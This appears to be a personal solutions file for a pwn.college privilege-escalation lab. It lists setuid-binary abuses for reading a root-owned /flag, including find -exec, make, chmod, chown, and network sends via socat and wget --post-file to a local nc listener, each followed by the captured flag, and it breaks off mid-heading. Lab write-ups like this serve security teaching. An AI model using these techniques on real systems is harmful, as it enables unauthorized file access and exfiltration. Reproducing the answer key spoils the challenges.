## Level1
cat /flag
pwn.college{QtsnU8z9ML4xAC9D0HwPvsxZdAZ.01M0EDLwIzW}

## Level2
/bin/more /flag
pwn.college{4ORRAzkDvbAD-VxaDn3Db0RWrUe.0FN0EDLwIzW}

## Level3
/bin/less /flag
pwn.college{0Rfi_rOUAJV6g6K3IKcIaH-nNuf.0VN0EDLwIzW}

## Level4
/bin/tail /flag
pwn.college{wi_uEv11t3CsahcKatsidEtsWo1.0lN0EDLwIzW}

## Level5
/bin/head /flag
pwn.college{48bZK2usgEXFNuSiAR15P-xo_Up.01N0EDLwIzW}

## Level6
/bin/sort /flag
pwn.college{4amjLTA47xoRaV0ywOWoRlveyt_.0FO0EDLwIzW}

## Level7
/bin/vim /flag
pwn.college{MzMnVZUD6DeYb62jnn0Fu4VSbLC.0VO0EDLwIzW}

## Level8
/bin/emacs /flag
pwn.college{IRZ0kRjSFx2tSRdRMWgrk7dFstB.0FM1EDLwIzW}

## Level9
/bin/nano /flag
pwn.college{kp3sD97Y6g6J0_4LV4QKofM01oG.0VM1EDLwIzW}

## Level10
/bin/rev /flag
rev the flag
pwn.college{wP1Atdp_a-0r10S70_0fTFKbxpk.0lM1EDLwIzW}

## Level11
/bin/od -t c /flag
pwn.college{AvZyYmdRGHe_pv9bYKMG3s4oYuz.01M1EDLwIzW}

## Level12
/bin/hd /flag
pwn.college{oOo5WcQG33-2uCKml1N7VjAx2DS.0FN1EDLwIzW}

## Level13
/bin/xxd /flag
pwn.college{MuFTf2zAFpjr-ZZD1NKdacKO-MV.0VN1EDLwIzW}

## Level14
/bin/base32 /flag
```
import base64
x = b'OB3W4LTDN5WGYZLHMV5XORRUNJCFAQKMN5ZWCQSPJNREEUKQJBHFCX3JJ5ITS2ZOGBWE4MKFIRGHOSL2K56QU==='
base64.b32decode(x)
```
pwn.college{wF4jDPALosaBOKbBQPHNQ_iOQ9k.0lN1EDLwIzW}

## Level15
/bin/base64 /flag
do the ipython
pwn.college{cYY7HN7U8Hlc66Sl9X0nR-mC4g1.01N1EDLwIzW}

## Level16
/bin/split /flag
cat xaa
pwn.college{4V8xbseCnzlEhAFCubmBCII9_P5.0FO1EDLwIzW}

## Level17
/bin/gzip /flag flag.gz
/bin/gzip -dc /flag.gz
pwn.college{MA6E3bm2XKzWe_Cduvz79ZCini8.0VO1EDLwIzW}

## Level18
/bin/bzip2 /flag flag.bz2
/bin/bzip2 -dc /flag.bz2
pwn.college{kAelI6zZm0qcJidECdCj4pKZ56u.0FM2EDLwIzW}

## Level19
/bin/zip -m /flag.zip /flag
/bin/unzip -c /flag.zip
pwn.college{Ucn_5hD7LOfr52FaWWbbgKh7cs0.0VM2EDLwIzW}

## Level20
/bin/tar -cf /flag.tar /flag
/bin/tar -xOvf /flag.tar
pwn.college{A7I5HGI7_suJAVVule_cvW-B_zN.0lM2EDLwIzW}

## Level21
/bin/ar r /flag.a /flag
/bin/ar p /flag.a
pwn.college{0VOQzQpy9LX-ycBn2AI0mXrM7Wg.01M2EDLwIzW}

## Level22
run the binary first
mkdir /tmp/pwn
echo "/flag" | /bin/cpio -R hacker -p /tmp/pwn
cat /tmp/pwn/flag
pwn.college{QA0disrgr2Wc5Ro9ffXdxUwF7n8.0FN2EDLwIzW}

## Level23
genisoimage --help 2>&1 | grep FILE
/bin/genisoimage -sort /flag
/bin/genisoimage: Incorrect sort file format
pwn.college{Mf__hdRDiuQE0tlUGULVx-dla2M.0VN2EDLwIzW}

## Level24
/bin/env -i cat /flag
pwn.college{0uj9Z12xXk2h4Q1B2rJedYDXxBx.0lN2EDLwIzW}

## Level25
find /flag -exec cat \{\} \;
pwn.college{0xstlY-Sr422_KC7Q9qEXBJCIuy.01N2EDLwIzW}

## Level26
Makefile
```
SHELL = /bin/sh
x=cat

all:
	cat /flag
```
make
pwn.college{gCE3UO5i2nNP-u0o2K6emjDklBS.0FO2EDLwIzW}

## Level27
/bin/nice --adjustment=10 cat /flag
pwn.college{wtWboGxA4-Q1gkXKUgDWfQ_uJZ8.0VO2EDLwIzW}

## Level28
/bin/timeout 15 cat /flag
pwn.college{YDxxfEntmoGdxwiKMDL1SGgZV5T.0FM3EDLwIzW}

## Level29
/bin/stdbuf -oL cat /flag
pwn.college{owg4pDD35L-r8zJxvS-zwTxQNjc.0VM3EDLwIzW}

## Level30
/bin/setarch -R cat /flag
pwn.college{wZAYkQR8zu7woR2jzsKUtU6GyOl.0lM3EDLwIzW}

## Level31
/bin/watch -x cat /flag
pwn.college{s_KsBziJ7p3SxX5Wwt3VoGsharH.01M3EDLwIzW}

## Level32
Set up listener on port 80
socat -u /flag TCP:localhost:80
pwn.college{MwB2Xfj_pg0A-gCd09Q3SRiXvWV.0FN3EDLwIzW}

## Level33
/bin/whiptail --textbox /flag 15 15
pwn.college{ExYQoIQTpmZUfUdR-_OmU9H2JQk.0VN3EDLwIzW}

## Level34
/bin/awk '{ print $1 }' /flag
pwn.college{glq7ddgzpKyML8RqyDV4a7hgJQC.0lN3EDLwIzW}

## Level35
/bin/sed 's/pwn/pwn/1' /flag
pwn.college{EtRbzYrJZRlAhJjBzZZWjCASBXu.01N3EDLwIzW}

## Level36
/bin/ed -p ':' /flag
:1
pwn.college{oEf5EmdZVd7lhbg4RV83i3mEjbb.0FO3EDLwIzW}

## Level37
bin/chown -R hacker:root /flag
pwn.college{YXyGMSEMOWQiKez--GQNzZaAyUd.0VO3EDLwIzW}

## Level38
/bin/chmod 777 /flag
pwn.college{IySyvfWd40QDmx-ZDySpfKpfliG.0FM4EDLwIzW}

## Level39
/bin/cp /flag /tmp/flag --no-preserve=mode
pwn.college{cZqwJ2_7WV58QAM_3yykrJRzgGn.0VM4EDLwIzW}

## Level40
Move /flag to ~
Go to level1 and cat it out lol
cat flag
pwn.college{Ajxxa9ESah3PnpIqF60-JTdGkoB.0lM4EDLwIzW}

## Level41
perl -ne'1..10 and print' /flag
pwn.college{M2HBzqkjxCRramBMkKgxH2UClQB.01M4EDLwIzW}

## Level42
/bin/python /flag
pwn.college{8y6gtiOYBGpKUUiwveBY6gTIN-H.0FN4EDLwIzW}

## Level43
/bin/ruby -0777 /flag
pwn.college{0NiDqcgyIOxxyVuqsUevoUWPWku.0VN4EDLwIzW}

## Level45
/bin/date -f /flag
/bin/date: invalid date ‘pwn.college{wE6uI_yqHLBDHheXFt90o32XpjH.01N4EDLwIzW}’

## Level46
/bin/dmesg -F /flag
[    0.000000] pwn.college{YxaoPZcLIKs6mwxRpob1T0jfSz4.0FO4EDLwIzW}

## Level47
/bin/wc --files0-from=/flag
/bin/wc: 'pwn.college{kAUFJ5r8QwTJLV_jjx7UiBCaF5W.0VO4EDLwIzW}'$'\n': No such file or directory

## Level48
script.c
```
#include </flag>
puts("test")
```
pwn.college{oWB03W7h7ceSPZJ89_8GUaGxMxz.0FM5EDLwIzW}

## Level49
as /flag
/flag: Assembler messages:
/flag:1: Error: no such instruction: pwn.college{EIX6mnsi95EGwpRgk5pFSr1lM4g.0VM5EDLwIzW}

## Level50
Term1:
nc -lp 80
pwn.college{cYHRC-_11AQF8K4QK218hmJ4u9X.0lM5EDLwIzW}

Term2:
/bin/wget --post-file=/flag http://localhost

## Lev




















